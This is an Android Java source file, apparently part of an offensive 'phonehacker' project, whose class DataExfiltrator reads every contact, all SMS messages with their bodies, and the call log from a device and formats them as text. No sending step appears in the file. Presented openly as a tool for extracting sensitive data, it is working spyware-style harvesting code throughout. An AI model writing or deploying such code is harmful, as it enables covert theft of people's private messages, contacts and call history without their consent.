package com.offensive.phonehacker;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;

/**
 * Data Exfiltrator - Extracts sensitive data from the local device using ContentResolver
 */
public class DataExfiltrator {
    private static final String TAG = "DataExfiltrator";
    private Context context;
    private ContentResolver resolver;
    
    public DataExfiltrator(Context context) {
        this.context = context;
        this.resolver = context.getContentResolver();
    }
    
    /**
     * Extract all contacts from the device
     */
    public List<Contact> getContacts() {
        List<Contact> contacts = new ArrayList<>();
        
        try {
            Cursor cursor = resolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            
            if (cursor != null) {
                int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int numberIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                int typeIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE);
                
                while (cursor.moveToNext()) {
                    Contact contact = new Contact();
                    contact.name = cursor.getString(nameIdx);
                    contact.number = cursor.getString(numberIdx);
                    contact.type = cursor.getInt(typeIdx);
                    contacts.add(contact);
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for contacts: " + e.getMessage());
        }
        
        return contacts;
    }
    
    /**
     * Extract SMS messages from the device
     */
    public List<SmsMessage> getSmsMessages() {
        List<SmsMessage> messages = new ArrayList<>();
        
        try {
            Cursor cursor = resolver.query(
                Telephony.Sms.CONTENT_URI,
                new String[]{
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.READ
                },
                null, null,
                Telephony.Sms.DATE + " DESC"
            );
            
            if (cursor != null) {
                int addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
                int typeIdx = cursor.getColumnIndex(Telephony.Sms.TYPE);
                int readIdx = cursor.getColumnIndex(Telephony.Sms.READ);
                
                while (cursor.moveToNext()) {
                    SmsMessage msg = new SmsMessage();
                    msg.address = cursor.getString(addressIdx);
                    msg.body = cursor.getString(bodyIdx);
                    msg.date = cursor.getLong(dateIdx);
                    msg.type = cursor.getInt(typeIdx);
                    msg.read = cursor.getInt(readIdx) == 1;
                    messages.add(msg);
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for SMS: " + e.getMessage());
        }
        
        return messages;
    }
    
    /**
     * Extract call logs from the device
     */
    public List<CallLogEntry> getCallLogs() {
        List<CallLogEntry> logs = new ArrayList<>();
        
        try {
            Cursor cursor = resolver.query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.TYPE
                },
                null, null,
                CallLog.Calls.DATE + " DESC"
            );
            
            if (cursor != null) {
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                
                while (cursor.moveToNext()) {
                    CallLogEntry entry = new CallLogEntry();
                    entry.number = cursor.getString(numberIdx);
                    entry.name = cursor.getString(nameIdx);
                    entry.date = cursor.getLong(dateIdx);
                    entry.duration = cursor.getLong(durationIdx);
                    entry.type = cursor.getInt(typeIdx);
                    logs.add(entry);
                }
                cursor.close();
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for call logs: " + e.getMessage());
        }
        
        return logs;
    }
    
    public String formatContactsAsString() {
        StringBuilder sb = new StringBuilder();
        for (Contact c : getContacts()) {
            sb.append(c.name).append(": ").append(c.number).append("\n");
        }
        return sb.toString();
    }
    
    public String formatSmsAsString() {
        StringBuilder sb = new StringBuilder();
        for (SmsMessage m : getSmsMessages()) {
            String direction = (m.type == 1) ? "[IN]" : "[OUT]";
            sb.append(direction).append(" ").append(m.address).append(": ").append(m.body).append("\n");
        }
        return sb.toString();
    }
    
    public String formatCallLogsAsString() {
        StringBuilder sb = new StringBuilder();
        for (CallLogEntry e : getCallLogs()) {
            String type = (e.type == 1) ? "IN" : (e.type == 2) ? "OUT" : "MISS";
            sb.append("[").append(type).append("] ").append(e.number);
            if (e.name != null) sb.append(" (").append(e.name).append(")");
            sb.append(" - ").append(e.duration).append("s\n");
        }
        return sb.toString();
    }
    
    public static class Contact {
        public String name;
        public String number;
        public int type;
    }
    
    public static class SmsMessage {
        public String address;
        public String body;
        public long date;
        public int type;
        public boolean read;
    }
    
    public static class CallLogEntry {
        public String number;
        public String name;
        public long date;
        public long duration;
        public int type;
    }
}
